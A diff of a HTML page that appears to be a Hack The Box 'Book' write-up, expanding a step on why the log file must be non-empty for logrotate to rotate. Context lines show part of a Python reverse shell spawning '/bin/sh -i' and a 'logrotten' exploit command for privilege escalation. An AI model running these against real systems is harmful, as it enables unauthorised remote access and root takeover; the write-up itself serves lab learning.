@@ -40,7 +40,7 @@
 <meta itemprop="description" content="A medium difficulty linux machine having real world like vulnerability">
 <meta itemprop="datePublished" content="2020-06-04T00:00:00&#43;00:00" />
 <meta itemprop="dateModified" content="2020-06-04T00:00:00&#43;00:00" />
-<meta itemprop="wordCount" content="1225">
+<meta itemprop="wordCount" content="1292">
 <meta itemprop="image" content="https://fmash16.github.io/img/htb_book/card.png">
 <meta itemprop="image" content="https://fmash16.github.io/">
 
@@ -629,7 +629,12 @@ with required args.</li>
 </span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">4</span><span style="color:#ed9d13">os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&#34;</span>/bin/sh<span style="color:#ed9d13">&#34;,&#34;</span>-i<span style="color:#ed9d13">&#34;]);&#39; &amp;
 </span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">5</span><span style="color:#ed9d13">./logrotten -d -p ./payloadfile /home/reader/backups/access.log
 </span></code></pre></div><ol start="2">
-<li>Next we need to write some random contents to the access.log file in backups.</li>
+<li>Next we need to write some random contents to the access.log file in backups. This
+necessary because the log file is not rotated if the file is empty and the
+<code>notifempty</code> parameter is set in the conf file. It is safe to write a
+big amount of junk into the logfile in case the <code>size</code> parameter is set
+in the conf file for logrotate, in which case, the rotation will only occur
+when the logfile gets larger than the sepcified size.</li>
 </ol>
 <div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">1</span><span style="color:#24909d">echo</span> hello &gt; access.log
 </code></pre></div><ol start="3">
